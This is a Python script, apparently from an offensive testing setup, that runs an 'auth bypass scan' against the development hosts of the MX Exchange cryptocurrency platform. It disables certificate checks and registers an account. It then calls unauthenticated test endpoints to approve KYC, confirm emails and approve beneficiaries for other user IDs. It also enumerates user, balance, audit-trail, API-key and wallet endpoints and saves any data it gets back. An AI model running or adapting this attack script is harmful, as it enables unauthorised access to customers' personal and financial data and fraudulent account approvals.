import requests, json, sys, urllib3, os
urllib3.disable_warnings()
os.environ["PYTHONIOENCODING"] = "utf-8"
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

S = requests.Session()
S.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Content-Type": "application/json",
    "Accept": "application/json",
})
TIMEOUT = 20

BASE = "https://accounthkdev.mx.exchange"

EMAIL = "marcos.herrera.dev@gmail.com"
PASSWORD = "MxTest2026!@#"
NAME = "Marcos Herrera"

def req(method, url, data=None):
    try:
        kw = {"timeout": TIMEOUT, "verify": False}
        if method == "POST":
            r = S.post(url, json=data, **kw)
        elif method == "PUT":
            r = S.put(url, json=data, **kw)
        elif method == "GET":
            r = S.get(url, **kw)
        else:
            return None
        return r
    except Exception as e:
        print(f"  [E] {method} {url} => {e}")
        return None

def safe(text, maxlen=400):
    return text[:maxlen].encode('ascii', 'replace').decode('ascii') if text else ""

results = {}

print("=" * 70)
print("MX EXCHANGE HK DEV — FULL AUTH BYPASS SCAN")
print("=" * 70)

# ========== 1: REGISTER ==========
print("\n[1] REGISTER...")
for acct_type in [0, 1, 2]:
    for country in [1, 130, 158]:
        payload = {
            "name": NAME,
            "email": EMAIL,
            "password": PASSWORD,
            "confirmPassword": PASSWORD,
            "country": country,
            "accountType": acct_type,
        }
        r = req("POST", f"{BASE}/api/Account/Register", payload)
        if r:
            print(f"  type={acct_type} country={country} => {r.status_code} ({len(r.text)}b) {safe(r.text, 300)}")
            if r.status_code in (200, 201):
                print("  [!!!] REGISTERED!")
                try:
                    results["register"] = r.json()
                except:
                    results["register"] = r.text

# ========== 2: TEST INTEGRATION EVENTS ==========
print("\n[2] TEST INTEGRATION EVENTS (NO AUTH)...")
events = [
    ("ApproveKyc", {"userId": 1}),
    ("ApproveKyc", {"userId": 2}),
    ("ApproveKyc", {"userId": 3}),
    ("ConfirmEmail", {"userId": 1}),
    ("ConfirmEmail", {"userId": 2}),
    ("ApproveBeneficiary", {"beneficiaryId": 1}),
    ("KycLevelPendingCount", {}),
    ("BeneficiaryPendingCount", {}),
]
for name, payload in events:
    r = req("POST", f"{BASE}/api/TestIntegrationEvent/{name}", payload)
    if r:
        tag = "[!!!]" if r.status_code in (200,201,204) else "[x]"
        print(f"  {tag} {name}({json.dumps(payload)}) => {r.status_code} {safe(r.text, 200)}")

# ========== 3: PUBLIC DATA ENDPOINTS ==========
print("\n[3] PUBLIC DATA SCAN...")
endpoints = [
    ("GET", "/api/MasterData"),
    ("GET", "/api/Roles"),
    ("GET", "/api/Roles/1"),
    ("GET", "/api/Banks/AllBank"),
    ("GET", "/api/Banks"),
    ("GET", "/api/Beneficiaries/CountryOfResidence"),
    ("GET", "/api/Beneficiaries/NationalityList"),
    ("GET", "/api/Kyc/KycFieldTypes"),
    ("GET", "/api/Kyc/KycApprovalStatuses"),
    ("GET", "/api/Kyc/KycLimitationTypes"),
    ("GET", "/api/Kyc/KycLimitationPeriodTypes"),
    ("GET", "/api/Kyc/KycLevels"),
    ("GET", "/api/Kyc/KycFields"),
    ("GET", "/api/Kyc/KycLimitations"),
    ("GET", "/api/Kyc/KycSubmitting"),
    ("GET", "/api/Kyc/KycSubmittingCount"),
    ("GET", "/api/Users"),
    ("GET", "/api/Users/1"),
    ("GET", "/api/Users/2"),
    ("GET", "/api/Users/3"),
    ("GET", "/api/Users/Balance/1"),
    ("GET", "/api/Users/Balance/2"),
    ("GET", "/api/Users/Balance/3"),
    ("GET", "/api/Users/Balance/4"),
    ("GET", "/api/Users/Balance/5"),
    ("GET", "/api/Users/Report"),
    ("GET", "/api/Users/TempList"),
    ("GET", "/api/Users/GetCustomerData"),
    ("GET", "/api/Users/GetCustomerAccountData"),
    ("GET", "/api/Users/GetUserStatus"),
    ("GET", "/api/Users/GetReferral"),
    ("GET", "/api/Users/UserInfo"),
    ("GET", "/api/Users/UserInfoDetails"),
    ("GET", "/api/AuditTrail"),
    ("GET", "/api/Groups"),
    ("GET", "/api/ExportReportLog"),
    ("GET", "/api/Account/ShortUserReport"),
    ("GET", "/api/Account/UserReport"),
    ("GET", "/api/Account/CheckSuspendedStatus"),
    ("GET", "/api/Account/GetOpenApiKey"),
    ("POST", "/api/Account/CheckAccountEmail"),
    ("POST", "/api/Account/CreateOpenApiKey"),
    ("GET", "/api/Account/VerifyReferralCode"),
    ("GET", "/api/Account/TotalRefereeCount"),
    ("GET", "/api/Account/1/Profile"),
    ("GET", "/api/Account/2/Profile"),
    ("GET", "/api/Account/1/Settings"),
    ("GET", "/api/Account/1/KycInfomations"),
    ("GET", "/api/Account/1/KycLevels"),
    ("GET", "/api/Account/1/KycSubmittings"),
    ("GET", "/api/Account/1/GetReferralLink"),
    ("POST", "/api/CountryAccessible"),
]

for method, path in endpoints:
    r = req(method, f"{BASE}{path}")
    if r:
        tag = "[!!!]" if r.status_code in (200,201,204) else "[x]" if r.status_code == 401 else "[?]"
        body = safe(r.text, 300)
        print(f"  {tag} {method:4s} {path} => {r.status_code} ({len(r.text)}b)")
        if r.status_code in (200, 201, 204) and r.text and len(r.text) > 2:
            print(f"       {body}")
            results[path] = r.text[:2000]

# ========== 4: WALLET API DEEP ==========
print("\n[4] WALLET API DEEP...")
WALLET = "https://wallethkdev.mx.exchange"
wallet_paths = [
    ("GET", "/api/Wallet"),
    ("GET", "/api/Wallet/1"),
    ("GET", "/api/Wallet/Balance"),
    ("GET", "/api/Wallet/Balance/1"),
    ("GET", "/api/Currency"),
    ("GET", "/api/Currency/1"),
    ("GET", "/api/Address"),
    ("GET", "/api/Address/1"),
    ("GET", "/api/Deposit"),
    ("GET", "/api/Deposit/1"),
    ("GET", "/api/Withdrawal"),
    ("GET", "/api/Withdrawal/1"),
    ("GET", "/api/Transfer"),
    ("GET", "/api/Transfer/1"),
    ("GET", "/api/Transaction"),
    ("GET", "/api/Transaction/1"),
    ("GET", "/api/WalletAddress"),
    ("GET", "/api/WalletAddress/1"),
]
for method, path in wallet_paths:
    r = req(method, f"{WALLET}{path}")
    if r:
        tag = "[!!!]" if r.status_code in (200,201,204) else "[x]" if r.status_code == 401 else "[?]"
        print(f"  {tag} {method:4s} {path} => {r.status_code} ({len(r.text)}b)")
        if r.status_code in (200, 201, 204) and r.text and len(r.text) > 2:
            print(f"       {safe(r.text, 300)}")
            results[f"wallet{path}"] = r.text[:2000]

# ========== SAVE ==========
with open(r"c:\xampp\htdocs\pentagi\mxexchange_attack\hkdev_bypass_results.json", "w") as f:
    json.dump(results, f, indent=2, ensure_ascii=True)
print(f"\n[+] Results saved to hkdev_bypass_results.json ({len(results)} hits)")
print("=" * 70)
print("DONE")
